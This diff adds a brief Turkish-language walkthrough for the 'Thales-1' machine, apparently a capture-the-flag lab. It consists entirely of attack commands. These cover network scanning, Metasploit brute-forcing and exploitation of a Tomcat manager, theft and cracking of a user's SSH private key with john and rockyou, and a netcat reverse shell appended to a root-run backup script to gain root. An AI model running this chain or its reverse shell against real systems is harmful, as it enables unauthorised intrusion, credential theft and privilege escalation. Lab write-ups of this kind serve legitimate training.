@@ -1,0 +1,11 @@
+THALES-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.61 bulundu.
+2 - nmap -sT -A -p- 192.168.2.61
+3 - msfconsole, auxiliary/scanner/http/tomcat_mgr_login, tomcat:role1
+4 - msfconsole, exploit/multi/http/tomcat_mgr_upload
+5 - download /home/thales/.ssh/id_rsa /home/alper/Downloads
+6 - ssh2john id_rsa > hash
+7 - john hash -w=/usr/share/wordlists/rockyou.txt, thales:vodka06
+8 - su thales, cat notes.txt, /usr/local/bin/backup.sh
+9 - echo "rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.128 8888 > /tmp/f" >> /usr/local/bin/backup.sh
+10 - whoami
